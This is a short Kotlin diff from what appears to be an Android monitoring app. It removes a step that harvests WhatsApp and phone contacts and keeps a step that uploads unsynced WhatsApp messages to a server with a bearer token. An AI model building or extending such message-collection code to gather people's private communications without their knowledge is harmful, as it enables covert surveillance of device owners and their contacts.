@@ -270,17 +270,7 @@ object RealtimeLogObserverManager {
                 val state = DeviceState(context)
                 val bearer = state.authToken?.let { "Bearer $it" } ?: return
 
-                // 1. Collect real WhatsApp and phone contacts if possible
-                try {
-                    val contacts = WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
-                    if (contacts.isNotEmpty()) {
-                        db.whatsAppMessageDao().insertAll(contacts)
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to collect WhatsApp contacts", e)
-                }
-
-                // 2. Upload any unsynced WhatsApp messages & contacts immediately
+                // Upload any unsynced WhatsApp messages immediately
                 val unsynced = db.whatsAppMessageDao().getUnsynced()
                 if (unsynced.isNotEmpty()) {
                     val dtos = unsynced.map {
